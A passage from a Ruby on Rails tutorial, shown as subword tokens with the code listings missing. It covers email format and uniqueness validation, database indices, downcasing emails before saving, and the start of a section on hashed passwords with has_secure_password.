▁With ▁our ▁test ▁suite ▁passing ▁again , ▁we ▁can ▁move ▁on ▁to ▁a ▁more ▁challenging ▁validation : ▁email ▁format .
▁Ou r ▁validations ▁for ▁the ▁\ k ode { name } ▁attribute ▁enforce ▁only ▁minimal ▁constraints --- any ▁non - blank ▁name ▁under ▁5 1 ▁characters ▁will ▁do --- but ▁of ▁course ▁the ▁\ k ode { email } ▁attribute ▁must ▁ satisf y ▁the ▁more ▁string ent ▁requirement ▁of ▁being ▁a ▁valid ▁email ▁address .
▁So ▁far ▁we ' ve ▁only ▁reject ed ▁blank ▁email ▁addresses ; ▁in ▁this ▁section , ▁we ' ll ▁require ▁email ▁addresses ▁to ▁con form ▁to ▁the ▁ familiar ▁pattern ▁\ k ode { user @ example . com }.
▁N either ▁the ▁tests ▁no r ▁the ▁validation ▁will ▁be ▁ ex ha us tive , ▁just ▁good ▁enough ▁to ▁accept ▁most ▁valid ▁email ▁addresses ▁and ▁reject ▁most ▁invalid ▁one s .
▁We ' ll ▁start ▁with ▁a ▁couple ▁of ▁tests ▁ involving ▁collection s ▁of ▁valid ▁and ▁invalid ▁addresses .
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁=> ▁[" foo ", ▁" bar ", ▁" baz "]
▁C O M ▁ THE _ U S - ER @ foo . bar . org ▁first . last @ foo . j p ]
▁C O M ", ▁" THE _ U S - ER @ foo . bar . org ", ▁" first . last @ foo . j p "]
▁ THE _ U S - ER @ foo . bar . org
▁first . last @ foo . j p
▁Here ▁we ' ve ▁iterate d ▁over ▁the ▁elements ▁of ▁the ▁\ k ode { address es } ▁array ▁using ▁the ▁\ k ode { each } ▁method ▁( Section ~\ ref { sec : block s }).
▁With ▁this ▁technique ▁in ▁hand , ▁we ' re ▁ready ▁to ▁write ▁some ▁basic ▁email ▁format ▁validation ▁tests .
▁Because ▁email ▁format ▁validation ▁is ▁trick y ▁and ▁error - prone , ▁we ' ll ▁start ▁with ▁some ▁passing ▁tests ▁for ▁\ emph { valid } ▁email ▁addresses ▁to ▁catch ▁any ▁errors ▁in ▁the ▁validation .
▁In ▁other ▁words , ▁we ▁want ▁to ▁make ▁sure ▁not ▁just ▁that ▁invalid ▁email ▁addresses ▁like ▁\ emph { user @ example , com } ▁are ▁reject ed , ▁but ▁also ▁that ▁valid ▁addresses ▁like ▁\ emph { user @ example . com } ▁are ▁accepted , ▁even ▁after ▁we ▁i mp o se ▁the ▁validation ▁constraint .
▁( R ight ▁now , ▁of ▁course , ▁they ' ll ▁be ▁accepted ▁because ▁all ▁non - blank ▁email ▁addresses ▁are ▁current ly ▁valid .)
▁The ▁result ▁for ▁a ▁represent a tive ▁sample ▁of ▁valid ▁email ▁addresses ▁appears ▁in ▁Listing ~\ ref { code : email _ format _ valid _ tests }.
▁Tests ▁for ▁valid ▁email ▁format s .
▁Note ▁that ▁we ' ve ▁included ▁an ▁optional ▁second ▁argument ▁to ▁the ▁assertion ▁with ▁a ▁custom ▁error ▁message , ▁which ▁in ▁this ▁case ▁identifie s ▁the ▁address ▁ ca using ▁the ▁test ▁to ▁fail :
▁( This ▁uses ▁the ▁interpolate d ▁\ k ode { inspect } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }. )
▁ Includ ing ▁the ▁specific ▁address ▁that ▁cause s ▁any ▁failure ▁is ▁es pecially ▁useful ▁in ▁a ▁test ▁with ▁an ▁\ k ode { each } ▁loop ▁like ▁Listing ~\ ref { code : email _ format _ valid _ tests } ; ▁otherwise , ▁any ▁failure ▁would ▁me re ly ▁identify ▁the ▁line ▁number , ▁which ▁is ▁the ▁same ▁for ▁all ▁the ▁email ▁addresses , ▁and ▁which ▁would n ' t ▁be ▁ s u ff ic i ent ▁to ▁identify ▁the ▁source ▁of ▁the ▁problem .
▁As ▁in ▁Listing ~\ ref { code : email _ format _ valid _ tests }, ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁ ca using ▁any ▁failure .
▁Tests ▁for ▁email ▁format ▁validation .
▁ foo @ bar _ baz . com ▁ foo @ bar + baz . com ]
▁The ▁application ▁code ▁for ▁email ▁format ▁validation ▁uses ▁the ▁\ k ode { format } ▁validation , ▁which ▁works ▁like ▁this :
▁This ▁validates ▁the ▁attribute ▁with ▁the ▁given ▁\ emph { r egular ▁expression } ▁( or ▁\ emph { regex }), ▁which ▁is ▁a ▁powerful ▁( and ▁often ▁ crypt ic ) ▁language ▁for ▁matching ▁pattern s ▁in ▁strings .
▁This ▁means ▁we ▁need ▁to ▁construct ▁a ▁regular ▁expression ▁to ▁match ▁valid ▁email ▁addresses ▁while ▁\ emph { not } ▁matching ▁invalid ▁one s .
▁full ▁regex
▁For ▁example , ▁did ▁you ▁know ▁that ▁\ k ode {" Michael ▁Hartl " @ example . com }, ▁with ▁ quot ation ▁mark s ▁and ▁a ▁ space ▁in ▁the ▁m id d le , ▁is ▁a ▁valid ▁email ▁address ▁according ▁to ▁the ▁standard ?
▁In credibly , ▁it ▁is --- but ▁it ' s ▁ abs ur d .
▁Here ' s ▁what ▁it ▁look s ▁like :
▁To ▁help ▁understand ▁where ▁this ▁comes ▁from , ▁Table ~\ ref { table : valid _ email _ regex } ▁break s ▁it ▁into ▁bit e - size d ▁pieces
▁Note ▁that , ▁in ▁Table ~\ ref { table : valid _ email _ regex }, ▁`` let ter '' ▁really ▁means ▁`` low er - case ▁letter '' , ▁but ▁the ▁\ k ode { i } ▁at ▁the ▁end ▁of ▁the ▁regex ▁enforce s ▁case - insensitive ▁matching .
▁start ▁of ▁regex
▁match ▁start ▁of ▁a ▁string
▁at ▁least ▁one ▁word ▁character , ▁plus , ▁h y ph en , ▁or ▁do t
▁literal ▁`` at ▁sign ''
▁at ▁least ▁one ▁letter , ▁d i git , ▁h y ph en , ▁or ▁do t
▁literal ▁do t
▁at ▁least ▁one ▁letter
▁match ▁end ▁of ▁a ▁string
▁end ▁of ▁regex
▁case - insensitive
▁B re a k ing ▁down ▁the ▁valid ▁email ▁regex .
▁A lthough ▁you ▁can ▁learn ▁a ▁lot ▁by ▁stud ying ▁Table ~\ ref { table : valid _ email _ regex }, ▁to ▁really ▁understand ▁regular ▁expression s ▁I ▁consider ▁using ▁an ▁interactive ▁regular ▁expression ▁match er ▁like ▁\ href { http :// www . rubular . com /}{ Rubular } ▁to ▁be ▁essential ▁( F igure ~\ ref { fig : rubular })
▁If ▁you ▁find ▁it ▁as ▁useful ▁as ▁I ▁do , ▁I ▁encourag e ▁you ▁to ▁\ href { http :// b it . ly / do n ate - to - rubular }{ do n ate ▁to ▁ Rubular } ▁to ▁re w ar d ▁developer ▁\ href { http :// lo v it t . net /}{ Michael ▁L o v it t } ▁for ▁his ▁won d er ful ▁work .
▁The ▁ Rubular ▁website ▁has ▁a ▁be a u t i ful ▁interactive ▁interface ▁for ▁making ▁regular ▁expression s , ▁along ▁with ▁a ▁hand y ▁regex ▁quick ▁reference .
▁I ▁encourag e ▁you ▁to ▁stud y ▁Table ~\ ref { table : valid _ email _ regex } ▁with ▁a ▁browser ▁window ▁open ▁to ▁ Rubular --- no ▁amount ▁of ▁reading ▁about ▁regular ▁expression s ▁can ▁replace ▁ play ing ▁with ▁them ▁interactive ly .
▁The ▁a we some ▁\ href { http :// www . rubular . com /}{ Rubular } ▁regular ▁expression ▁editor .
▁App ly ing ▁the ▁regular ▁expression ▁from ▁Table ~\ ref { table : valid _ email _ regex } ▁to ▁the ▁\ k ode { email } ▁format ▁validation ▁yields ▁the ▁code ▁in ▁Listing ~\ ref { code : validates _ format _ of _ email }.
▁Validat ing ▁the ▁email ▁format ▁with ▁a ▁regular ▁expression .
▁Here ▁the ▁regex ▁\ k ode { VALID \_ EMAIL \_ RE G E X } ▁is ▁a ▁\ emph { constant }, ▁indicate d ▁in ▁Ruby ▁by ▁a ▁name ▁starting ▁with ▁a ▁c api t al ▁letter .
▁ensure s ▁that ▁only ▁email ▁addresses ▁that ▁match ▁the ▁pattern ▁will ▁be ▁consider ed ▁valid .
▁( The ▁expression ▁above ▁has ▁one ▁not able ▁we a k n es s : ▁it ▁allows ▁invalid ▁addresses ▁that ▁contain ▁con sec u tive ▁do t s , ▁such ▁as ▁\ k ode { foo @ bar . . com }.
▁Fix ing ▁this ▁blemish ▁requires ▁a ▁significant ly ▁more ▁complicated ▁regular ▁expression ▁and ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises }).)
▁This ▁means ▁that ▁there ' s ▁only ▁one ▁constraint ▁left : ▁enforc ing ▁email ▁uniqueness .
▁To ▁enforce ▁uniqueness ▁of ▁email ▁addresses ▁( so ▁that ▁we ▁can ▁use ▁them ▁as ▁username s ), ▁we ' ll ▁be ▁using ▁the ▁\ k ode { : un i q ue } ▁option ▁to ▁the ▁\ k ode { validates } ▁method .
▁But ▁be ▁ w ar n ed : ▁there ' s ▁a ▁\ emph { ma j or } ▁caveat , ▁so ▁don ' t ▁just ▁ s k i m ▁this ▁section --- read ▁it ▁careful ly .
▁We ' ll ▁start ▁with ▁some ▁short ▁tests .
▁In ▁our ▁previous ▁model ▁tests , ▁we ' ve ▁main ly ▁used ▁\ k ode { User . new }, ▁which ▁just ▁creates ▁a ▁Ruby ▁object ▁in ▁memory , ▁but ▁for ▁uniqueness ▁tests ▁we ▁actually ▁need ▁to ▁put ▁a ▁record ▁into ▁the ▁database
▁As ▁noted ▁brief ly ▁in ▁the ▁introduction ▁to ▁this ▁section , ▁there ▁is ▁a ▁d ed icated ▁test ▁database , ▁\ k ode { db / test . sqlite 3 }, ▁for ▁this ▁purpose .
▁The ▁initial ▁duplicate ▁email ▁test ▁appears ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test }.
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses .
▁The ▁method ▁here ▁is ▁to ▁make ▁a ▁user ▁with ▁the ▁same ▁email ▁address ▁as ▁\ k ode {@ user } ▁using ▁\ k ode {@ user . dup }, ▁which ▁creates ▁a ▁duplicate ▁user ▁with ▁the ▁same ▁attributes .
▁S ince ▁we ▁the n ▁save ▁\ k ode {@ user }, ▁the ▁duplicate ▁user ▁has ▁an ▁email ▁address ▁that ▁already ▁exists ▁in ▁the ▁database , ▁and ▁hence ▁should ▁not ▁be ▁valid .
▁We ▁can ▁get ▁the ▁new ▁test ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ test } ▁to ▁pass ▁by ▁adding ▁\ k ode { uniqueness : ▁true } ▁to ▁the ▁\ k ode { email } ▁validation , ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email }.
▁Validat ing ▁the ▁uniqueness ▁of ▁email ▁addresses .
▁We ' re ▁not ▁quite ▁done , ▁though .
▁ Technical ly , ▁only ▁the ▁domain ▁part ▁of ▁the ▁email ▁address ▁is ▁case - insensitive : ▁\ emph { foo @ bar . com } ▁is ▁actually ▁different ▁from ▁\ emph { Foo @ bar . com }.
▁In ▁practice , ▁though , ▁it ▁is ▁a ▁ bad ▁idea ▁to ▁rely ▁on ▁this ▁fact ; ▁as ▁noted ▁at ▁\ href { http :// email . about . com / o d / email be h in d the sc en es / f / email _ case _ s en s . h t m }{ about . com }, ▁`` S ince ▁the ▁case ▁ s en s it i v ity ▁of ▁email ▁addresses ▁can ▁create ▁a ▁lot ▁of ▁confusion , ▁in ter o p er ability ▁problem s ▁and ▁ wide s p read ▁ head a ch es , ▁it ▁would ▁be ▁ foo li s h ▁to ▁require ▁email ▁addresses ▁to ▁be ▁type d ▁with ▁the ▁correct ▁case .
▁H ar d ly ▁any ▁email ▁ service ▁or ▁I S P ▁does ▁enforce ▁case ▁ sensitive ▁email ▁addresses , ▁return ing ▁messages ▁who se ▁re c ip i ent ' s ▁email ▁address ▁was ▁not ▁type d ▁correctly ▁( in ▁all ▁upper ▁case , ▁for ▁example ).
▁ '' ▁T hanks ▁to ▁reader ▁R i le y ▁Mo s es ▁for ▁point ing ▁this ▁out .
▁It ' s ▁thus ▁important ▁to ▁test ▁for ▁case - in s en s it i v ity , ▁which ▁we ▁do ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test }.
▁Testing ▁case - insensitive ▁email ▁uniqueness .
▁Here ▁we ▁are ▁using ▁the ▁\ k ode { up case } ▁method ▁on ▁strings ▁( see n ▁brief ly ▁in ▁Section ~\ ref { sec : block s }).
▁This ▁test ▁does ▁the ▁same ▁thing ▁as ▁the ▁initial ▁duplicate ▁email ▁test , ▁but ▁with ▁an ▁upper - case ▁email ▁address ▁instead .
▁If ▁this ▁test ▁feel s ▁a ▁little ▁abstract , ▁go ▁a head ▁and ▁fire ▁up ▁the ▁console :
▁=> ▁" U S ER @ E X A MPLE . C O M "
▁For t un ate ly , ▁\ k ode { : uniqueness } ▁accept s ▁an ▁option , ▁\ k ode { : case \_ sensitive }, ▁for ▁just ▁this ▁purpose ▁( Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive }).
▁Validat ing ▁the ▁uniqueness ▁of ▁email ▁addresses , ▁ignoring ▁case .
▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive }.
▁( Rails ▁infer s ▁that ▁\ k ode { uniqueness } ▁should ▁be ▁\ k ode { true } ▁as ▁well .)
▁At ▁this ▁point , ▁our ▁application --- with ▁an ▁important ▁caveat --- en force s ▁email ▁uniqueness , ▁and ▁our ▁test ▁suite ▁should ▁pass :
▁There ' s ▁just ▁one ▁small ▁problem , ▁which ▁is ▁that ▁\ emph { the ▁Active ▁Record ▁uniqueness ▁validation ▁does ▁not ▁guarantee ▁uniqueness ▁at ▁the ▁database ▁level }.
▁Here ' s ▁a ▁scenario ▁that ▁ explain s ▁why :
▁A li ce ▁sign s ▁up ▁for ▁the ▁sample ▁app , ▁with ▁address ▁a li ce @ w on d er l and . com .
▁A li ce ▁accidental ly ▁click s ▁on ▁`` S u b m it '' ▁\ emph { t w ic e }, ▁sending ▁two ▁requests ▁in ▁quick ▁ success ion .
▁The ▁following ▁sequence ▁occur s : ▁request ▁1 ▁creates ▁a ▁user ▁in ▁memory ▁that ▁passes ▁validation , ▁request ▁2 ▁does ▁the ▁same , ▁request ~ 1 ' s ▁user ▁get s ▁saved , ▁request ~ 2 ' s ▁user ▁get s ▁saved .
▁Re s ul t : ▁two ▁user ▁records ▁with ▁the ▁exact ▁same ▁email ▁address , ▁desp ite ▁the ▁uniqueness ▁validation
▁If ▁the ▁above ▁sequence ▁seem s ▁i mp la us i b le , ▁believe ▁me , ▁it ▁is n ' t : ▁it ▁can ▁happen ▁on ▁any ▁Rails ▁website ▁with ▁significant ▁traffic ▁( which ▁I ▁once ▁ learned ▁the ▁hard ▁way ).
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement : ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well ▁as ▁at ▁the ▁model ▁level .
▁Database ▁indices
▁When ▁creating ▁a ▁column ▁in ▁a ▁database , ▁it ▁is ▁important ▁to ▁consider ▁whether ▁we ▁will ▁need ▁to ▁\ emph { find } ▁records ▁by ▁that ▁column .
▁Consider , ▁for ▁example , ▁the ▁\ text tt { email } ▁attribute ▁created ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration }.
▁When ▁we ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁sample ▁app ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁will ▁need ▁to ▁find ▁the ▁user ▁record ▁corresponding ▁to ▁the ▁submitted ▁email ▁address .
▁This ▁is ▁known ▁in ▁the ▁database ▁ business ▁as ▁a ▁\ emph { full - table ▁ s can }, ▁and ▁for ▁a ▁real ▁site ▁with ▁ th ous and s ▁of ▁users ▁it ▁is ▁a ▁\ href { http :// cat b . org / j argon / html / B / B ad - T h ing . html }{ B ad ▁T h ing }.
▁P utting ▁an ▁index ▁on ▁the ▁email ▁column ▁fix es ▁the ▁problem .
▁To ▁understand ▁a ▁database ▁index , ▁it ' s ▁helpful ▁to ▁consider ▁the ▁analogy ▁of ▁a ▁book ▁index .
▁In ▁a ▁book , ▁to ▁find ▁all ▁the ▁occur r ence s ▁of ▁a ▁given ▁string , ▁say ▁`` foobar '' , ▁you ▁would ▁have ▁to ▁ s can ▁each ▁page ▁for ▁`` foobar '' --- the ▁ paper ▁version ▁of ▁a ▁full - table ▁ s can .
▁With ▁a ▁book ▁index , ▁on ▁the ▁other ▁hand , ▁you ▁can ▁just ▁look ▁up ▁`` foobar '' ▁in ▁the ▁index ▁to ▁see ▁all ▁the ▁pages ▁containing ▁`` foobar ''.
▁A ▁database ▁index ▁works ▁essential ly ▁the ▁same ▁way .
▁The ▁email ▁index ▁represent s ▁an ▁update ▁to ▁our ▁data ▁model ing ▁requirements , ▁which ▁( as ▁discuss ed ▁in ▁Section ~\ ref { sec : database _ migrations }) ▁is ▁handle d ▁in ▁Rails ▁using ▁migrations .
▁We ▁saw ▁in ▁Section ~\ ref { sec : database _ migrations } ▁that ▁ generating ▁the ▁User ▁model ▁automatically ▁created ▁a ▁new ▁migration ▁( Listing ~\ ref { code : users _ migration }) ; ▁in ▁the ▁present ▁case , ▁we ▁are ▁adding ▁structure ▁to ▁an ▁existing ▁model , ▁so ▁we ▁need ▁to ▁create ▁a ▁migration ▁directly ▁using ▁the ▁\ k ode { migration } ▁generator :
▁Un like ▁the ▁migration ▁for ▁users , ▁the ▁email ▁uniqueness ▁migration ▁is ▁not ▁pre - defined , ▁so ▁we ▁need ▁to ▁fill ▁in ▁its ▁contents ▁with ▁Listing ~\ ref { code : email _ uniqueness _ index }
▁Of ▁course , ▁we ▁could ▁just ▁edit ▁the ▁migration ▁file ▁for ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : users _ migration }, ▁but ▁that ▁would ▁require ▁roll ing ▁back ▁and ▁the n ▁migrat ing ▁back ▁up .
▁The ▁Rails ▁Way T M ▁is ▁to ▁use ▁migrations ▁every ▁time ▁we ▁ discover ▁that ▁our ▁data ▁model ▁needs ▁to ▁change .
▁The ▁migration ▁for ▁enforc ing ▁email ▁uniqueness .
▁This ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { add \_ index } ▁to ▁add ▁an ▁index ▁on ▁the ▁\ k ode { email } ▁column ▁of ▁the ▁\ k ode { users } ▁table .
▁The ▁index ▁by ▁itself ▁does n ' t ▁enforce ▁uniqueness , ▁but ▁the ▁option ▁\ k ode { un i q ue : ▁true } ▁does .
▁The ▁final ▁step ▁is ▁to ▁ migrate ▁the ▁database :
▁( If ▁this ▁fails , ▁try ▁exit ing ▁any ▁running ▁ sandbox ▁console ▁sessions , ▁which ▁can ▁ lock ▁the ▁database ▁and ▁prevent ▁migrations .)
▁User ▁fixtures ▁were ▁generated ▁automatically ▁in ▁Listing ~\ ref { code : generate _ user _ model }, ▁and ▁as ▁show n ▁in ▁Listing ~\ ref { code : default _ fixtures } ▁the ▁email ▁addresses ▁are ▁not ▁unique .
▁( The y ' re ▁not ▁\ emph { valid } ▁either , ▁but ▁fixture ▁data ▁does n ' t ▁get ▁run ▁through ▁the ▁validations .)
▁The ▁default ▁user ▁fixtures .
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }).
▁An ▁empty ▁fixtures ▁file .
▁If ▁you ' re ▁interest ed ▁in ▁see ing ▁the ▁practical ▁effect ▁of ▁this , ▁take ▁a ▁look ▁at ▁the ▁file ▁\ k ode { db / schema . rb }, ▁which ▁should ▁now ▁include ▁a ▁line ▁like ▁this :
▁Having ▁address ed ▁the ▁uniqueness ▁caveat , ▁there ' s ▁one ▁more ▁change ▁we ▁need ▁to ▁make ▁to ▁be ▁as s ur ed ▁of ▁email ▁uniqueness .
▁Some ▁database ▁adapter s ▁use ▁case - sensitive ▁indices , ▁consider ing ▁the ▁strings ▁`` Foo @ Ex A M P le .
▁To ▁avoid ▁this ▁in compatibility , ▁we ' ll ▁standard ize ▁on ▁all ▁lower - case ▁addresses , ▁convert ing ▁`` Foo @ Ex A M P le . Co M '' ▁to ▁`` foo @ example . com '' ▁before ▁\ line break ▁saving ▁it ▁to ▁the ▁database .
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en . wiki p edia . org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoked ▁at ▁a ▁particular ▁point ▁in ▁the ▁life c y c le ▁of ▁an ▁Active ▁Record ▁object .
▁In ▁the ▁present ▁case , ▁that ▁point ▁is ▁before ▁the ▁object ▁is ▁saved , ▁so ▁we ' ll ▁use ▁a ▁\ k ode { before \_ save } ▁callback ▁to ▁ downcase ▁the ▁email ▁attribute ▁before ▁saving ▁the ▁user
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 2 . 2 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : email _ downcase }
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : account _ activation s _ resource }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks .)
▁Ensur ing ▁email ▁uniqueness ▁by ▁downcas ing ▁the ▁email ▁attribute .
▁The ▁code ▁in ▁Listing ~\ ref { code : email _ downcase } ▁passes ▁a ▁block ▁to ▁the ▁\ k ode { before \_ save } ▁callback ▁and ▁set s ▁the ▁user ' s ▁email ▁address ▁to ▁a ▁lower - case ▁version ▁of ▁its ▁current ▁value ▁using ▁the ▁\ k ode { downcase } ▁string ▁method .
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises }).)
▁In ▁Listing ~\ ref { code : email _ downcase }, ▁we ▁could ▁have ▁written ▁the ▁assignment ▁as
▁( where ▁\ k ode { self } ▁refer s ▁to ▁the ▁current ▁user ), ▁but ▁inside ▁the ▁User ▁model ▁the ▁\ k ode { self } ▁keyword ▁is ▁optional ▁on ▁the ▁right - h and ▁side :
▁We ▁ en counter ed ▁this ▁idea ▁brief ly ▁in ▁the ▁context ▁of ▁\ k ode { reverse } ▁in ▁the ▁\ k ode { palindrome } ▁method ▁( Section ~\ ref { sec : a _ class _ of _ our _ own }), ▁which ▁also ▁noted ▁that ▁\ k ode { self } ▁is ▁\ emph { not } ▁optional ▁in ▁an ▁assignment , ▁so
▁would n ' t ▁work .
▁( We ' ll ▁discuss ▁this ▁subject ▁in ▁more ▁depth ▁in ▁Section ~\ ref { sec : remember _ me }. )
▁At ▁this ▁point , ▁the ▁A li ce ▁scenario ▁above ▁will ▁work ▁fine : ▁the ▁database ▁will ▁save ▁a ▁user ▁record ▁base d ▁on ▁the ▁first ▁request , ▁and ▁it ▁will ▁reject ▁the ▁second ▁save ▁for ▁violat ing ▁the ▁uniqueness ▁constraint .
▁( A n ▁error ▁will ▁appear ▁in ▁the ▁Rails ▁log , ▁but ▁that ▁does n ' t ▁do ▁any ▁harm .)
▁Now ▁that ▁we ' ve ▁defined ▁validations ▁for ▁the ▁name ▁and ▁email ▁fields , ▁we ' re ▁ready ▁to ▁add ▁the ▁last ▁of ▁the ▁basic ▁User ▁attributes : ▁a ▁secure ▁password .
▁The ▁method ▁is ▁to ▁require ▁each ▁user ▁to ▁have ▁a ▁password ▁( with ▁a ▁password ▁confirmation ), ▁and ▁the n ▁store ▁a ▁\ emph { hash ed } ▁version ▁of ▁the ▁password ▁in ▁the ▁database .
▁( The re ▁is ▁some ▁potential ▁for ▁confusion ▁here .
▁In ▁the ▁present ▁context , ▁a ▁\ emph { hash } ▁refer s ▁not ▁to ▁the ▁Ruby ▁data ▁structure ▁from ▁Section ~\ ref { sec : hashes _ and _ symbol s } ▁but ▁rather ▁to ▁the ▁result ▁of ▁apply ing ▁an ▁ ir reversible ▁\ href { http :// en . wiki p edia . org / wiki / Hash _ function }{ hash ▁function } ▁to ▁input ▁data .)
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁The ▁method ▁for ▁ authenticating ▁users ▁will ▁be ▁to ▁take ▁a ▁submitted ▁password , ▁hash ▁it , ▁and ▁compare ▁the ▁result ▁to ▁the ▁hash ed ▁value ▁store d ▁in ▁the ▁database .
▁If ▁the ▁two ▁match , ▁the n ▁the ▁submitted ▁password ▁is ▁correct ▁and ▁the ▁user ▁is ▁ authenticated .
▁By ▁compar ing ▁hash ed ▁values ▁instead ▁of ▁raw ▁passwords , ▁we ▁will ▁be ▁able ▁to ▁authenticate ▁users ▁without ▁storing ▁the ▁passwords ▁themselves .
▁This ▁means ▁that , ▁even ▁if ▁our ▁database ▁is ▁compromise d , ▁our ▁users ' ▁passwords ▁will ▁ still ▁be ▁secure .
▁< n >< n > ▁\ subsection { A ▁hash ed ▁password } ▁% ▁( fold )< n > ▁\ label { sec : a _ hash ed _ password }< n >< n >
▁ Most ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password }, ▁which ▁we ' ll ▁include ▁in ▁the ▁User ▁model ▁as ▁follows :
▁When ▁included ▁in ▁a ▁model ▁as ▁above , ▁this ▁one ▁method ▁add s ▁the ▁following ▁functionality :
▁The ▁ability ▁to ▁save ▁a ▁secure ly ▁hash ed ▁\ k ode { password \_ digest } ▁attribute ▁to ▁the ▁database
▁In ▁this ▁context , ▁\ emph { v ir t u al } ▁means ▁that ▁the ▁attributes ▁exist ▁on ▁the ▁model ▁object ▁but ▁do ▁not ▁correspond ▁to ▁columns ▁in ▁the ▁database .
▁An ▁\ k ode { authenticate } ▁method ▁that ▁returns ▁the ▁user ▁when ▁the ▁password ▁is ▁correct ▁( and ▁\ k ode { false } ▁otherwise )
▁The ▁only ▁requirement ▁for ▁\ k ode { has \_ secure \_ password } ▁to ▁work ▁its ▁magic ▁is ▁for ▁the ▁corresponding ▁model ▁to ▁have ▁an ▁attribute ▁called ▁\ k ode { password \_ digest }. ▁(
▁The ▁name ▁\ emph { digest } ▁comes ▁from ▁the ▁terminology ▁of ▁\ href { http :// en . wiki p edia . org / wiki / C ry p t ographic _ hash _ function }{ crypt ographic ▁hash ▁functions }.
▁In ▁this ▁context , ▁\ emph { hash ed ▁password } ▁and ▁\ emph { password ▁digest } ▁are ▁ s y n on y m s .)
▁ Hash ed ▁password ▁digest s ▁are ▁often ▁ er r one ous ly ▁ referred ▁to ▁as ▁\ emph { encrypted ▁passwords }.
▁For ▁example , ▁the ▁\ href { https :// github . com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password . rb }{ source ▁code } ▁of ▁\ k ode { has \_ secure \_ password } ▁make s ▁this ▁mistake , ▁as ▁did ▁the ▁first ▁two ▁edition s ▁of ▁this ▁tutorial .
▁This ▁terminology ▁is ▁wrong ▁because ▁by ▁design ▁encrypt ion ▁is ▁\ emph { reversible }--- the ▁ability ▁to ▁encrypt ▁implie s ▁the ▁ability ▁to ▁\ emph { de crypt } ▁as ▁well .
▁In ▁contrast , ▁the ▁whole ▁point ▁of ▁calculat ing ▁a ▁password ' s ▁hash ▁digest ▁is ▁to ▁be ▁\ emph { ir reversible }, ▁so ▁that ▁it ▁is ▁com put ation ally ▁in tr ac table ▁to ▁infer ▁the ▁original ▁password ▁from ▁the ▁digest . ▁(
▁T hanks ▁to ▁reader ▁ Andy ▁P h il ips ▁for ▁point ing ▁out ▁this ▁issue ▁and ▁for ▁encourag ing ▁me ▁to ▁fix ▁the ▁broken ▁terminology .)
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁this ▁lead s ▁to ▁the ▁data ▁model ▁show n ▁in ▁F igure ~\ ref { fig : user _ model _ password _ digest }.
▁The ▁User ▁data ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁To ▁implement ▁the ▁data ▁model ▁in ▁F igure ~\ ref { fig : user _ model _ password _ digest } ▁ , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column .
▁The ▁result , ▁with ▁migration ▁name ▁\ k ode { add \_ password \_ digest \_ to \_ users }, ▁appears ▁as ▁follows :
▁Here ▁we ' ve ▁also ▁supplied ▁the ▁argument ▁\ k ode { password \_ digest : string } ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁ Compar e ▁this ▁to
▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration }.
▁The ▁migration ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
